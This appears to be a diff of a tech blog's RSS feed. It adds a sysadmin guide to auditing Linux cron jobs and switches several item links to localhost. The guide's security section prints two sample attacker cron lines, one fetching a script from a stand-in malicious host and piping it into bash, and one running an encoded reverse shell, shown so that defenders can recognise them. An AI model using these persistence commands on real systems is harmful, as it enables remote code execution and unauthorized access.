@@ -7,10 +7,342 @@
     <generator>Logya</generator>
     <docs>http://blogs.law.harvard.edu/tech/rss</docs>
     <item>
+        <title><![CDATA[How to Inspect All Cron Jobs on a Linux System: A Sysadmin's Guide]]></title>
+        <link><![CDATA[http://localhost:8080/geeklog/how-to-inspect-all-cron-jobs-on-a-linux-system/]]></link>
+        <description><![CDATA[<p>Learn how to inspect and audit cron jobs on Linux systems, identify suspicious tasks, and follow best practices to keep your scheduled tasks secure and efficient.</p>]]></description>
+        <guid><![CDATA[http://localhost:8080/geeklog/how-to-inspect-all-cron-jobs-on-a-linux-system/]]></guid>
+        <pubDate>Tue, 10 Feb 2026 19:28:05 </pubDate>
+        <content:encoded><![CDATA[
+        <p>Cron is one of the most fundamental tools in a Linux sysadmin's toolkit. It powers everything from nightly database backups to certificate renewals, log rotations, and application health checks. Once scheduled, cron jobs run silently in the background, which is both their strength and their risk.</p>
+<p>Because cron jobs run unattended, they are easy to overlook. Over time, a server accumulates scheduled tasks added by different users, applications, and installers. Without periodic audits, it becomes impossible to know exactly what is running on your system, when, and as whom.</p>
+<p>This guide will teach you where cron jobs live on a Linux system, how to inspect them for all users at once, what normal cron jobs look like, and what suspicious ones look like. By the end, you will have a repeatable process for auditing scheduled tasks on any Linux server.</p>
+<h2 id="a-quick-cron-refresher">A Quick Cron Refresher</h2>
+<h3 id="how-cron-works">How Cron Works</h3>
+<p>Cron is a time-based job scheduler. The <code>crond</code> daemon runs continuously in the background and wakes up every minute to check whether any scheduled task is due to run. Jobs are defined in crontab files, which are plain text files that include a schedule and a command.</p>
+<p>There are two types of crontabs: user crontabs (personal to each system user) and system crontabs (owned by root or placed in dedicated directories by applications). Both are checked by the same <code>crond</code> daemon.</p>
+<h3 id="cron-schedule-syntax">Cron Schedule Syntax</h3>
+<p>Every cron job starts with five fields that define when the job should run, followed by the command itself:</p>
+<pre><code class="language-txt">* * * * *  command
+│ │ │ │ │
+│ │ │ │ └─ Day of week (0–7, Sunday = 0 or 7)
+│ │ │ └─── Month (1–12)
+│ │ └───── Day of month (1–31)
+│ └─────── Hour (0–23)
+└───────── Minute (0–59)
+</code></pre>
+<p>An asterisk <code>*</code> in any field means "every" — every minute, every hour, and so on. Commas let you specify multiple values (<code>1,15,30</code>). Hyphens define ranges (<code>1-5</code> for Monday through Friday). A forward slash defines a step (<code>*/15</code> means every 15 minutes).</p>
+<p>For example:</p>
+<pre><code class="language-bash"># Run at 2:30 AM every day
+30 2 * * * /usr/local/bin/backup.sh
+
+# Run every 15 minutes
+*/15 * * * * /usr/local/bin/healthcheck.sh
+
+# Run at noon on the first of every month
+0 12 1 * * /usr/local/bin/monthly-report.sh
+</code></pre>
+<h3 id="special-time-strings">Special Time Strings</h3>
+<p>Cron also supports shorthand strings as an alternative to the five-field syntax:</p>
+<table>
+<thead>
+<tr>
+<th>String</th>
+<th>Equivalent</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>@reboot</code></td>
+<td>—</td>
+<td>Run once at system startup</td>
+</tr>
+<tr>
+<td><code>@hourly</code></td>
+<td><code>0 * * * *</code></td>
+<td>Run once per hour</td>
+</tr>
+<tr>
+<td><code>@daily</code></td>
+<td><code>0 0 * * *</code></td>
+<td>Run once per day at midnight</td>
+</tr>
+<tr>
+<td><code>@weekly</code></td>
+<td><code>0 0 * * 0</code></td>
+<td>Run once per week on Sunday</td>
+</tr>
+<tr>
+<td><code>@monthly</code></td>
+<td><code>0 0 1 * *</code></td>
+<td>Run once per month on the first</td>
+</tr>
+<tr>
+<td><code>@yearly</code></td>
+<td><code>0 0 1 1 *</code></td>
+<td>Run once per year on January 1st</td>
+</tr>
+</tbody>
+</table>
+<h2 id="common-real-world-cron-job-examples">Common Real-World Cron Job Examples</h2>
+<p>Understanding what legitimate cron jobs look like makes it much easier to spot unusual or suspicious ones. Here are the most common categories of scheduled tasks you will encounter in production environments.</p>
+<h3 id="backups">Backups</h3>
+<p>Backups are among the most important scheduled tasks on any server. Common examples include nightly database dumps, syncing files to remote storage, and archiving log files.</p>
+<pre><code class="language-bash"># Dump MySQL database nightly at 1 AM
+0 1 * * * root mysqldump -u root mydb &gt; /backups/mydb_$(date +\%F).sql
+</code></pre>
+<h3 id="log-rotation-and-cleanup">Log Rotation and Cleanup</h3>
+<p>Log files can consume enormous amounts of disk space if left unchecked. Cron jobs are used to rotate logs, compress old ones, and purge entries beyond a certain age. On most systems, <code>logrotate</code> is itself invoked by a daily cron job.</p>
+<pre><code class="language-bash"># Logrotate runs as a daily cron job on most systems (/etc/cron.daily/logrotate)
+/usr/sbin/logrotate /etc/logrotate.conf
+
+# Delete temp files older than 7 days
+0 3 * * * root find /tmp -mtime +7 -delete
+</code></pre>
+<h3 id="tls-certificate-renewal">TLS Certificate Renewal</h3>
+<p>Let's Encrypt certificates expire every 90 days. Certbot installs a cron job or systemd timer to handle renewal automatically. If installed via a package manager, you will typically find it in <code>/etc/cron.d/</code> or <code>/etc/cron.daily/</code>.</p>
+<pre><code class="language-bash"># Certbot renewal check twice daily (common pattern)
+0 */12 * * * root certbot renew --quiet
+</code></pre>
+<h3 id="system-updates">System Updates</h3>
+<p>Some organizations configure servers to apply security updates automatically on a schedule, reducing the window of exposure from known vulnerabilities.</p>
+<pre><code class="language-bash"># Apply security updates weekly (Debian/Ubuntu)
+0 4 * * 0 root apt-get update &amp;&amp; apt-get -y upgrade
+
+# Run yum-cron for automatic updates (RHEL/CentOS)
+0 0 * * * root /usr/sbin/yum-cron
+</code></pre>
+<h3 id="monitoring-and-health-checks">Monitoring and Health Checks</h3>
+<p>Cron is often used to run lightweight monitoring checks that send an alert or write to a log if something is amiss. Disk usage checks, ping tests, and process monitoring are common examples.</p>
+<pre><code class="language-bash"># Alert if disk usage exceeds 90%
+*/10 * * * * root df -h | awk '$5 &gt; 90 {print}' | mail -s 'Disk Warning' admin@example.com
+
+# Check that Apache is running every 5 minutes, restart if not
+*/5 * * * * root pgrep apache2 || systemctl restart apache2
+</code></pre>
+<h3 id="application-maintenance">Application Maintenance</h3>
+<p>Applications often install their own cron jobs as part of their package setup. These jobs handle tasks such as cleaning up PHP sessions, scrubbing filesystems, and restarting internal services. For instance, CloudPanel installs daily jobs to restart <code>rsyslog</code> and its own agent service as part of regular housekeeping for a hosting control panel.</p>
+<pre><code class="language-bash"># Clean PHP sessions twice per hour
+09,39 * * * * root [ -x /usr/lib/php/sessionclean ] &amp;&amp; /usr/lib/php/sessionclean
+
+# CloudPanel: restart logging service nightly
+5 0 * * * clp /usr/bin/sudo /etc/init.d/rsyslog restart &amp;&gt; /dev/null
+
+# CloudPanel: restart agent service
+15 2 * * * clp /usr/bin/sudo /usr/bin/systemctl restart clp-agent &amp;&gt; /dev/null
+</code></pre>
+<h2 id="where-cron-jobs-live-on-a-linux-system">Where Cron Jobs Live on a Linux System</h2>
+<p>Cron jobs can be defined in several different places. A thorough audit requires checking all of them.</p>
+<table>
+<thead>
+<tr>
+<th>Location</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>/etc/crontab</code></td>
+<td>Main system crontab</td>
+</tr>
+<tr>
+<td><code>/etc/cron.d/</code></td>
+<td>Application-specific cron files</td>
+</tr>
+<tr>
+<td><code>/etc/cron.hourly/</code></td>
+<td>Scripts run every hour</td>
+</tr>
+<tr>
+<td><code>/etc/cron.daily/</code></td>
+<td>Scripts run every day</td>
+</tr>
+<tr>
+<td><code>/etc/cron.weekly/</code></td>
+<td>Scripts run every week</td>
+</tr>
+<tr>
+<td><code>/etc/cron.monthly/</code></td>
+<td>Scripts run every month</td>
+</tr>
+<tr>
+<td><code>/var/spool/cron/crontabs/</code></td>
+<td>User crontabs (Debian/Ubuntu)</td>
+</tr>
+<tr>
+<td><code>/var/spool/cron/</code></td>
+<td>User crontabs (RHEL/CentOS)</td>
+</tr>
+</tbody>
+</table>
+<h3 id="etccrontab">/etc/crontab</h3>
+<p>The main system-wide crontab. Unlike user crontabs, entries here include an additional field specifying which user the command runs as. You can view it with <code>cat /etc/crontab</code>.</p>
+<h3 id="etccrond">/etc/cron.d/</h3>
+<p>Applications that need to install their own cron schedules drop files here rather than modifying the main crontab. Each file follows the same format as <code>/etc/crontab</code>. This is commonly where you will find jobs from packages like <code>sysstat</code>, <code>certbot</code>, and hosting control panels.</p>
+<h3 id="etccrondaily-cronhourly-cronweekly-cronmonthly">/etc/cron.daily/, cron.hourly/, cron.weekly/, cron.monthly/</h3>
+<p>These directories contain plain shell scripts (not crontab format) that are executed on the corresponding schedule. The timing is determined by entries in <code>/etc/crontab</code> or by the <code>anacron</code> service. List their contents with:</p>
+<pre><code class="language-bash">ls -la /etc/cron.daily/
+ls -la /etc/cron.hourly/
+ls -la /etc/cron.weekly/
+ls -la /etc/cron.monthly/
+</code></pre>
+<h3 id="varspoolcron">/var/spool/cron/</h3>
+<p>User crontabs are created by individual users via <code>crontab -e</code> and stored here, in files named after each user. On Debian and Ubuntu the subdirectory is called <code>crontabs</code>; on Red Hat-based systems the files sit directly in <code>/var/spool/cron/</code>. As root you can read any of them directly.</p>
+<h2 id="how-to-inspect-cron-jobs">How to Inspect Cron Jobs</h2>
+<h3 id="your-own-crontab">Your Own Crontab</h3>
+<p>View your own user's crontab with:</p>
+<pre><code class="language-bash">crontab -l
+</code></pre>
+<p>If you have no cron jobs set up, this will print <code>no crontab for &lt;username&gt;</code>.</p>
+<h3 id="a-specific-users-crontab">A Specific User's Crontab</h3>
+<p>As root, inspect any individual user's crontab using the <code>-u</code> flag:</p>
+<pre><code class="language-bash">crontab -u username -l
+</code></pre>
+<h3 id="all-users-at-once">All Users at Once</h3>
+<p>The most thorough approach is to loop through every user on the system and print their crontab. The following one-liner reads all usernames from <code>/etc/passwd</code> and queries each one:</p>
+<pre><code class="language-bash">for user in $(cut -f1 -d: /etc/passwd); do
+    echo &quot;=== Crontab for $user ===&quot;
+    crontab -u $user -l 2&gt;/dev/null
+done
+</code></pre>
+<p>The <code>2&gt;/dev/null</code> suppresses the "no crontab for this user" messages, keeping the output clean. Only users with actual cron jobs will produce output beyond the header line.</p>
+<h3 id="system-cron-files">System Cron Files</h3>
+<p>Check all system-level cron configuration in one pass:</p>
+<pre><code class="language-bash"># View the main system crontab
+cat /etc/crontab
+
+# View all files in cron.d
+cat /etc/cron.d/*
+
+# List scripts in the schedule directories
+ls -la /etc/cron.daily/
+ls -la /etc/cron.hourly/
+ls -la /etc/cron.weekly/
+ls -la /etc/cron.monthly/
+</code></pre>
+<h3 id="directly-inspect-the-spool-directory">Directly Inspect the Spool Directory</h3>
+<p>You can also read user crontabs directly from the spool directory as root, which is useful for scripting and automation:</p>
+<pre><code class="language-bash"># Debian/Ubuntu
+grep -r . /var/spool/cron/crontabs/ 2&gt;/dev/null
+
+# RHEL/CentOS
+grep -r . /var/spool/cron/ 2&gt;/dev/null
+</code></pre>
+<h3 id="check-running-cron-processes">Check Running Cron Processes</h3>
+<p>To verify the cron daemon is active and see any currently running cron processes:</p>
+<pre><code class="language-bash"># Check daemon status
+systemctl status cron       # Debian/Ubuntu
+systemctl status crond      # RHEL/CentOS
+
+# List running cron processes
+ps aux | grep cron
+</code></pre>
+<h3 id="view-cron-logs">View Cron Logs</h3>
+<p>Cron logs reveal what has already run, including errors and timing. Check the relevant log file for your distribution:</p>
+<pre><code class="language-bash"># Debian/Ubuntu: cron entries in syslog
+grep CRON /var/log/syslog | tail -50
+
+# RHEL/CentOS: dedicated cron log
+tail -50 /var/log/cron
+
+# systemd-based systems: use journalctl
+journalctl -u cron --since today
+journalctl -u crond --since today
+</code></pre>
+<blockquote>
+<p><strong>Tip:</strong> If a cron job is failing silently, the logs are usually the first place to look. An error in the logs combined with an unexpected system state (missing files, full disk) can quickly reveal the culprit.</p>
+</blockquote>
+<h2 id="a-note-on-systemd-timers">A Note on Systemd Timers</h2>
+<p>On modern Linux distributions, systemd timers are increasingly used as an alternative or complement to cron. They provide more precise scheduling, dependency management, and built-in logging through the journal. Importantly, a job defined as a systemd timer will <strong>not</strong> appear in any crontab audit.</p>
+<p>To see all systemd timers, including the next scheduled run time for each:</p>
+<pre><code class="language-bash">systemctl list-timers --all
+</code></pre>
+<p>If you find timers you do not recognize, investigate the associated service unit:</p>
+<pre><code class="language-bash"># Show the timer definition
+systemctl cat my-timer.timer
+
+# Show what service the timer activates
+systemctl cat my-timer.service
+</code></pre>
+<p>On many Debian and Ubuntu servers, you might find that certain tasks you would expect to be cron jobs, like <code>apt</code> daily updates and <code>e2fsck</code> scrubbing, have been moved to systemd timers. For this reason, it's important to include both cron and systemd in any full audit of scheduled tasks.</p>
+<h2 id="security-considerations">Security Considerations</h2>
+<h3 id="why-attackers-love-cron">Why Attackers Love Cron</h3>
+<p>Cron is a favorite tool for attackers seeking persistence. Once they have gained access to a system, planting a cron job ensures they retain that access even if the initial vulnerability is patched, the compromised process is restarted, or the system is rebooted. A well-hidden cron job can persist for months without detection.</p>
+<h3 id="what-suspicious-cron-jobs-look-like">What Suspicious Cron Jobs Look Like</h3>
+<p>When auditing cron jobs after a suspected compromise, look for any of the following red flags:</p>
+<ul>
+<li>Commands that download files from the internet, especially <code>curl</code> or <code>wget</code> piped directly to <code>bash</code></li>
+<li>Commands that connect back to an unusual IP address or domain (reverse shells)</li>
+<li>Base64-encoded commands, which are used to obfuscate payloads</li>
+<li>Jobs that write to unexpected locations, especially <code>/tmp</code>, <code>/dev/shm</code>, or hidden directories</li>
+<li>Jobs running as root that were not placed there by a known package</li>
+<li>Jobs that modify <code>/etc/passwd</code>, <code>/etc/shadow</code>, or SSH <code>authorized_keys</code> files</li>
+<li>Cron job names designed to blend in with legitimate system tasks</li>
+</ul>
+<p>A particularly common attacker pattern looks like this:</p>
+<pre><code class="language-bash"># Classic cryptominer persistence via cron
+*/5 * * * * root curl -s http://malicious.example.com/update.sh | bash
+
+# Obfuscated reverse shell
+*/10 * * * * nobody echo YmFzaCAtaSA+Ji9kZXYvdGNw... | base64 -d | bash
+</code></pre>
+<h3 id="best-practices">Best Practices</h3>
+<p>Following a few simple principles can significantly reduce your risk surface around cron:</p>
+<ul>
+<li><strong>Principle of least privilege:</strong> Cron jobs should run as the least privileged user possible. Avoid running jobs as root unless absolutely necessary. Use dedicated service accounts with restricted permissions for specific tasks.</li>
+<li><strong>Log cron output:</strong> Redirect stdout and stderr to a log file rather than discarding output. Silent failures are harder to detect, and logs can help debug unexpected issues.</li>
+<li><strong>Periodic audits:</strong> Schedule a regular review of all cron jobs as part of your security routine, not just after incidents. Include both user and system crontabs and ensure no unauthorized entries exist.</li>
+<li><strong>Version control:</strong> Keep a copy of known-good cron configurations in source control so you can diff against what is currently on the server. This helps you quickly identify unwanted changes.</li>
+<li><strong>Monitor for changes:</strong> Use tools like <code>auditd</code> or similar file integrity monitoring systems to alert you when crontab files are modified. Monitoring <code>/var/spool/cron/</code>, <code>/etc/crontab</code>, and <code>/etc/cron.d/</code> for alterations can provide early warnings of unauthorized additions.</li>
+<li><strong>Restrict user access:</strong> Control who can create cron jobs by using <code>/etc/cron.allow</code> and <code>/etc/cron.deny</code>. Only users with a legitimate need for scheduled tasks should be permitted to create them. Keeping this list concise limits your system's attack surface.</li>
+<li><strong>Validate scripts before scheduling:</strong> Run and review scripts manually before automating them in cron to ensure they work as intended and do not introduce unintended security vulnerabilities.</li>
+<li><strong>Balance output redirection:</strong> Log cron job output where possible, but ensure sensitive systems like production servers aren't overwhelmed by excessive log noise. For jobs where reliability is proven, you may discard output selectively using <code>&gt; /dev/null 2&gt;&amp;1</code>. However, even in these cases, ensure failure alerts are captured elsewhere.</li>
+<li><strong>Check for systemd timers:</strong> Include systemd timers in any full audit. They are increasingly used as an alternative to cron jobs and must be inspected to identify scheduled system tasks. Use <code>systemctl list-timers --all</code> regularly.</li>
+<li><strong>Time-zone awareness:</strong> Be mindful of time zones when scheduling cron jobs, especially on systems that might operate in multiple regions or adjust for daylight savings. Server configurations running in UTC time can help standardize schedules.</li>
+</ul>
+<pre><code class="language-bash"># Good practice: log cron output to a file
+0 2 * * * root /usr/local/bin/backup.sh &gt;&gt; /var/log/backup.log 2&gt;&amp;1
+
+# Discard output only when you are certain the job is reliable
+0 3 * * * root /usr/local/bin/cleanup.sh &gt; /dev/null 2&gt;&amp;1
+</code></pre>
+<p>By combining these practices into your workflow, you can greatly enhance the reliability and security of your scheduled tasks. Make auditing and maintaining cron jobs a regular routine alongside other system maintenance tasks.</p>
+<h2 id="conclusion">Conclusion</h2>
+<p>Cron jobs are an essential aspect of Linux system administration, but their silent, automated nature often makes them easy to forget. Over time, a server that has been running for years can gather dozens of scheduled tasks from various users, packages, and installers. Some of these tasks might no longer be necessary, while others might even pose a risk.</p>
+<p>Here is a quick-reference audit checklist you can run on any server:</p>
+<pre><code class="language-bash"># 1. Check all user crontabs
+for user in $(cut -f1 -d: /etc/passwd); do
+    echo &quot;=== $user ===&quot;
+    crontab -u $user -l 2&gt;/dev/null
+done
+
+# 2. Check system crontabs
+cat /etc/crontab
+cat /etc/cron.d/*
+
+# 3. List cron script directories
+ls -la /etc/cron.{daily,hourly,weekly,monthly}/
+
+# 4. Read spool directly
+grep -r . /var/spool/cron/crontabs/ 2&gt;/dev/null   # Debian/Ubuntu
+grep -r . /var/spool/cron/ 2&gt;/dev/null             # RHEL/CentOS
+
+# 5. Check systemd timers too
+systemctl list-timers --all
+
+# 6. Review recent cron log activity
+grep CRON /var/log/syslog | tail -100
+</code></pre>
+<p>Make auditing your cron jobs a regular routine rather than a reactive measure when something goes wrong. Performing this audit quarterly or including it in your server onboarding checklist will provide a much clearer understanding of what your systems are doing, even during those early hours of the morning.</p>
+<hr>
+<p>Thank you for reading!</p>
+<p>This article was written by Ramiro Gómez using open source software and the assistance of AI tools. While I strive to ensure accurate information, please verify any details independently before taking action. For more articles, visit the <a href="https://geeksta.net/geeklog/">Geeklog on geeksta.net</a>.</p>        ]]></content:encoded>
+    </item>
+    <item>
         <title><![CDATA[Building a 3D Elevation Photo Diary with deck.gl]]></title>
-        <link><![CDATA[https://geeksta.net/geeklog/building-a-3d-elevation-photo-diary/]]></link>
+        <link><![CDATA[http://localhost:8080/geeklog/building-a-3d-elevation-photo-diary/]]></link>
         <description><![CDATA[<p>How I turned GPS-tagged vacation photos into an interactive 3D journey through the terrain of Spain around Nerja.</p><img src="https://exploring-data.com/img/preview/elevation-diary-nerja.png" alt="Preview Image">]]></description>
-        <guid><![CDATA[https://geeksta.net/geeklog/building-a-3d-elevation-photo-diary/]]></guid>
+        <guid><![CDATA[http://localhost:8080/geeklog/building-a-3d-elevation-photo-diary/]]></guid>
         <pubDate>Thu, 05 Feb 2026 12:50:16 </pubDate>
         <content:encoded><![CDATA[
         <p>During a recent two-week vacation in Nerja, Spain, I took hundreds of photos with my phone. Many of them captured GPS coordinates and altitude data. Instead of letting that metadata sit unused, I decided to build an interactive 3D visualization that plots each photo on the actual terrain where it was taken.</p>
@@ -112,9 +444,9 @@ IMG_20260106_132810881,36.78705,-3.883663888888889,197.6,2026:01:06 13:28:12
     </item>
     <item>
         <title><![CDATA[Thunderbird Keeps Threading Emails? Here's the Fix]]></title>
-        <link><![CDATA[https://geeksta.net/geeklog/thunderbird-keeps-threading-emails-here-s-the-fix/]]></link>
+        <link><![CDATA[http://localhost:8080/geeklog/thunderbird-keeps-threading-emails-here-s-the-fix/]]></link>
         <description><![CDATA[<p>Thunderbird keeps switching to threaded view? Learn how to adjust settings and repair folders to keep your view the way you want it.</p>]]></description>
-        <guid><![CDATA[https://geeksta.net/geeklog/thunderbird-keeps-threading-emails-here-s-the-fix/]]></guid>
+        <guid><![CDATA[http://localhost:8080/geeklog/thunderbird-keeps-threading-emails-here-s-the-fix/]]></guid>
         <pubDate>Mon, 26 Jan 2026 20:49:16 </pubDate>
         <content:encoded><![CDATA[
         <p>If Mozilla Thunderbird keeps switching your folders back to <strong>Threaded View</strong> even after you turn it off, you're not imagining things. This is a long-standing Thunderbird quirk caused by multiple, overlapping view settings.</p>
@@ -181,9 +513,9 @@ IMG_20260106_132810881,36.78705,-3.883663888888889,197.6,2026:01:06 13:28:12
     </item>
     <item>
         <title><![CDATA[Social Media Dimensions Cheat Sheet 2025]]></title>
-        <link><![CDATA[https://geeksta.net/geeklog/social-media-dimensions-cheat-sheet/]]></link>
+        <link><![CDATA[http://localhost:8080/geeklog/social-media-dimensions-cheat-sheet/]]></link>
         <description><![CDATA[<p>Comprehensive social media dimensions cheat sheet for Facebook, Instagram, YouTube, and TikTok. Includes profile pictures, cover photos, posts, stories, reels, and video sizes for optimal display.</p><img src="/img/geeklog/social-media-dimensions-cheat-sheet.webp" alt="Preview Image">]]></description>
-        <guid><![CDATA[https://geeksta.net/geeklog/social-media-dimensions-cheat-sheet/]]></guid>
+        <guid><![CDATA[http://localhost:8080/geeklog/social-media-dimensions-cheat-sheet/]]></guid>
         <pubDate>Fri, 19 Dec 2025 12:32:42 </pubDate>
         <content:encoded><![CDATA[
         <p>Getting your images and videos to look perfect across social media platforms can be frustrating when you're working with the wrong dimensions. Each platform has its own specific requirements for profile pictures, cover photos, posts, and videos. This comprehensive cheat sheet provides all the up-to-date dimensions you need for Facebook, Instagram, YouTube, and TikTok in one convenient reference guide. Whether you're creating content for your personal brand, business page, or client projects, bookmark this page to ensure your visuals always display at their best quality across every platform.</p>
@@ -340,9 +672,9 @@ IMG_20260106_132810881,36.78705,-3.883663888888889,197.6,2026:01:06 13:28:12
     </item>
     <item>
         <title><![CDATA[How Limiting My Internet Usage Changed the Way I Work and Live]]></title>
-        <link><![CDATA[https://geeksta.net/geeklog/limited-internet-changed-my-habits/]]></link>
+        <link><![CDATA[http://localhost:8080/geeklog/limited-internet-changed-my-habits/]]></link>
         <description><![CDATA[<p>Read about how a 30GB monthly data cap transformed my relationship with the Internet, improved productivity, reduced distractions, and encouraged more intentional habits in work and daily life.</p>]]></description>
-        <guid><![CDATA[https://geeksta.net/geeklog/limited-internet-changed-my-habits/]]></guid>
+        <guid><![CDATA[http://localhost:8080/geeklog/limited-internet-changed-my-habits/]]></guid>
         <pubDate>Wed, 03 Dec 2025 13:11:51 </pubDate>
         <content:encoded><![CDATA[
         <p>After canceling my DSL subscription, I decided to rely solely on mobile data for my Internet access at home. To make things even more intentional, I chose a data plan capped at 30GB per month. For someone who works from home as a system administrator and programmer, this monthly limit might sound restrictive — especially when you factor in the need to update software and keep a reliable connection for work.</p>
@@ -372,9 +704,9 @@ IMG_20260106_132810881,36.78705,-3.883663888888889,197.6,2026:01:06 13:28:12
     </item>
     <item>
         <title><![CDATA[Practical Tips to Reduce Data Usage on Phones, Tablets, and Computers]]></title>
-        <link><![CDATA[https://geeksta.net/geeklog/reduce-data-usage-guide/]]></link>
+        <link><![CDATA[http://localhost:8080/geeklog/reduce-data-usage-guide/]]></link>
         <description><![CDATA[<p>Discover simple, effective tips to reduce data usage on phones, tablets, and computers. Save data, lower costs, and improve your online experience with practical steps.</p>]]></description>
-        <guid><![CDATA[https://geeksta.net/geeklog/reduce-data-usage-guide/]]></guid>
+        <guid><![CDATA[http://localhost:8080/geeklog/reduce-data-usage-guide/]]></guid>
         <pubDate>Sat, 29 Nov 2025 12:30:15 </pubDate>
         <content:encoded><![CDATA[
         <p>With the growing reliance on the Internet, managing your data usage has become more critical than ever, especially if you're on a limited or expensive mobile data plan. Excessive consumption can lead to hefty overage fees, slower tethered speeds, or simply running out of data altogether. Whether you're using a smartphone, tablet, or computer, this guide offers practical tips to help reduce data usage while staying connected and productive.</p>
@@ -437,9 +769,9 @@ IMG_20260106_132810881,36.78705,-3.883663888888889,197.6,2026:01:06 13:28:12
     </item>
     <item>
         <title><![CDATA[Fail2ban Cheat Sheet for Sysadmins]]></title>
-        <link><![CDATA[https://geeksta.net/geeklog/fail2ban-cheat-sheet/]]></link>
+        <link><![CDATA[http://localhost:8080/geeklog/fail2ban-cheat-sheet/]]></link>
         <description><![CDATA[<p>Fail2ban is an essential tool for protecting Linux systems from brute-force attacks by monitoring logs and banning IPs that exhibit malicious behavior. This cheat sheet provides the most important concepts and commands for managing Fail2ban effectively.</p>]]></description>
-        <guid><![CDATA[https://geeksta.net/geeklog/fail2ban-cheat-sheet/]]></guid>
+        <guid><![CDATA[http://localhost:8080/geeklog/fail2ban-cheat-sheet/]]></guid>
         <pubDate>Thu, 20 Nov 2025 22:08:28 </pubDate>
         <content:encoded><![CDATA[
         <p>Fail2ban is a critical tool for safeguarding servers against brute-force attacks by monitoring logs and banning malicious IPs. This cheat sheet provides the most important concepts and commands for managing Fail2ban effectively.</p>
@@ -618,9 +950,9 @@ sudo systemctl restart fail2ban</code></p>
     </item>
     <item>
         <title><![CDATA[Build Mental Resilience: A 30-Day Challenge Inspired by Science]]></title>
-        <link><![CDATA[https://geeksta.net/geeklog/resilience-challenge-introduction/]]></link>
+        <link><![CDATA[http://localhost:8080/geeklog/resilience-challenge-introduction/]]></link>
         <description><![CDATA[<p>Start building resilience with a free 30-day challenge. This introduction explains the science-backed daily practices for lasting mental strength.</p><img src="/img/tools/resilience-challenge.png" alt="Preview Image">]]></description>
-        <guid><![CDATA[https://geeksta.net/geeklog/resilience-challenge-introduction/]]></guid>
+        <guid><![CDATA[http://localhost:8080/geeklog/resilience-challenge-introduction/]]></guid>
         <pubDate>Mon, 06 Oct 2025 14:17:37 </pubDate>
         <content:encoded><![CDATA[
         <p>After listening to the insightful discussion on resilience research in the SOLVED Podcast with Mark Manson and Drew Bernie, I felt inspired to create something practical. The episode highlighted that resilience isn't a mysterious trait but a skill that can be developed. This led me to create <a href="/tools/resilience/">a free, simple online tool</a> designed to help people build resilience through daily practice. Here's an example of a daily challenge from the tool.</p>
@@ -679,9 +1011,9 @@ sudo systemctl restart fail2ban</code></p>
     </item>
     <item>
         <title><![CDATA[Setting Up Google Drive Backups on Ubuntu with rclone]]></title>
-        <link><![CDATA[https://geeksta.net/geeklog/setting-up-google-drive-backups-on-ubuntu-with-rclone/]]></link>
+        <link><![CDATA[http://localhost:8080/geeklog/setting-up-google-drive-backups-on-ubuntu-with-rclone/]]></link>
         <description><![CDATA[<p>Learn how to set up automated backups from Ubuntu Linux to Google Drive using rclone, including OAuth setup, backup scripts, and scheduling with cron.</p>]]></description>
-        <guid><![CDATA[https://geeksta.net/geeklog/setting-up-google-drive-backups-on-ubuntu-with-rclone/]]></guid>
+        <guid><![CDATA[http://localhost:8080/geeklog/setting-up-google-drive-backups-on-ubuntu-with-rclone/]]></guid>
         <pubDate>Tue, 30 Sep 2025 13:55:47 </pubDate>
         <content:encoded><![CDATA[
         <p>This tutorial will show you how to set up automated backups from Ubuntu Linux to Google Drive using rclone. You'll need Ubuntu Linux, a Google account with Google Drive, and terminal access with sudo privileges.</p>
@@ -873,9 +1205,9 @@ rclone ls gdrive:Backups --max-depth 2 | tail -n 10
     </item>
     <item>
         <title><![CDATA[Protecting Your Email Server: SASL Authentication and fail2ban Defense]]></title>
-        <link><![CDATA[https://geeksta.net/geeklog/protecting-your-email-server/]]></link>
+        <link><![CDATA[http://localhost:8080/geeklog/protecting-your-email-server/]]></link>
         <description><![CDATA[<p>Learn how to protect your email server from brute force attacks using SASL authentication and fail2ban. Complete guide with setup instructions and best practices.</p>]]></description>
-        <guid><![CDATA[https://geeksta.net/geeklog/protecting-your-email-server/]]></guid>
+        <guid><![CDATA[http://localhost:8080/geeklog/protecting-your-email-server/]]></guid>
         <pubDate>Fri, 05 Sep 2025 21:34:28 </pubDate>
         <content:encoded><![CDATA[
         <p>Email servers are prime targets for cybercriminals looking to exploit authentication systems for spam distribution and unauthorized access. Understanding SASL authentication and implementing proper fail2ban protection is crucial for maintaining email security. This guide explains these concepts in simple terms and provides practical implementation strategies.</p>
@@ -928,125 +1260,6 @@ rclone ls gdrive:Backups --max-depth 2 | tail -n 10
 <p>SASL authentication attacks represent a persistent threat to email server security, but fail2ban provides an effective automated defense mechanism. By properly configuring filters and jail settings, system administrators can significantly reduce successful brute force attempts while maintaining accessibility for legitimate users.</p>
 <p>The key to success lies in understanding your specific environment's needs and adjusting fail2ban parameters accordingly. Regular monitoring and fine-tuning ensure your email server remains both secure and accessible to authorized users.</p>
 <p>Remember that security is an ongoing process rather than a one-time setup. Stay informed about emerging attack patterns and adjust your defenses as the threat landscape evolves.</p>
-<hr>
-<p>Thank you for reading!</p>
-<p>This article was written by Ramiro Gómez using open source software and the assistance of AI tools. While I strive to ensure accurate information, please verify any details independently before taking action. For more articles, visit the <a href="https://geeksta.net/geeklog/">Geeklog on geeksta.net</a>.</p>        ]]></content:encoded>
-    </item>
-    <item>
-        <title><![CDATA[The Centenarian Decathlon: A Practical Guide to Thriving into Your 90s and Beyond]]></title>
-        <link><![CDATA[https://geeksta.net/geeklog/the-centenarian-decathlon/]]></link>
-        <description><![CDATA[<p>Future-proof your independence with the Centenarian Decathlon. Build resilience, energy, and confidence in your 50s through smart, practical training.</p>]]></description>
-        <guid><![CDATA[https://geeksta.net/geeklog/the-centenarian-decathlon/]]></guid>
-        <pubDate>Tue, 19 Aug 2025 00:43:41 </pubDate>
-        <content:encoded><![CDATA[
-        <h2 id="what-is-the-centenarian-decathlon">What is the Centenarian Decathlon?</h2>
-<p>The <strong>Centenarian Decathlon</strong>, introduced by <a href="https://en.wikipedia.org/wiki/Peter_Attia">Dr. Peter Attia</a>, is not a sporting event but a <strong>longevity framework</strong>. It’s a way to prepare your body for the movements and activities that matter most in everyday life so you can remain strong, independent, and active into your 90s and beyond.</p>
-<p>The idea is simple: picture yourself at age 100 and ask, <em>What do I still want to be able to do?</em> These become your personal <em>events</em>. By identifying them now and training deliberately, you build the strength, endurance, balance, and mobility to sustain those abilities later in life.</p>
